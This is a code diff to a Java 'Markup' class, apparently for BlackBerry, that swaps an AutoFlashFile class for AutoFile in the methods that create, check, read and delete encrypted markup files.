@@ -18,7 +18,7 @@ import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
-import blackberry.fs.AutoFlashFile;
+import blackberry.fs.AutoFile;
 import blackberry.fs.Path;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
@@ -147,7 +147,7 @@ public class Markup {
         Check.asserts(markupName != "", "markupName empty");
         //#endif
 
-        final AutoFlashFile file = new AutoFlashFile(markupName, true);
+        final AutoFile file = new AutoFile(markupName, true);
         file.delete();
     }
 
@@ -188,7 +188,7 @@ public class Markup {
 
     String lognName;
 
-    AutoFlashFile file;
+    AutoFile file;
 
     Encryption encryption;
 
@@ -243,7 +243,7 @@ public class Markup {
         Check.asserts(markupName != "", "markupName empty");
         //#endif
 
-        final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
+        final AutoFile fileRet = new AutoFile(markupName, true);
 
         return fileRet.exists();
     }
@@ -270,7 +270,7 @@ public class Markup {
         Check.asserts(markupName != "", "markupName empty");
         //#endif
 
-        final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
+        final AutoFile fileRet = new AutoFile(markupName, true);
 
         if (fileRet.exists()) {
             final byte[] encData = fileRet.read();
@@ -318,7 +318,7 @@ public class Markup {
         //#ifdef DEBUG
         debug.trace("removeMarkup: " + markupName);
         //#endif
-        final AutoFlashFile remove = new AutoFlashFile(markupName, true);
+        final AutoFile remove = new AutoFile(markupName, true);
         remove.delete();
     }
 
@@ -340,7 +340,7 @@ public class Markup {
         Check.asserts(markupName != "", "markupName empty");
         //#endif
 
-        final AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
+        final AutoFile fileRet = new AutoFile(markupName, true);
 
         // se il file esiste viene azzerato
         fileRet.create();
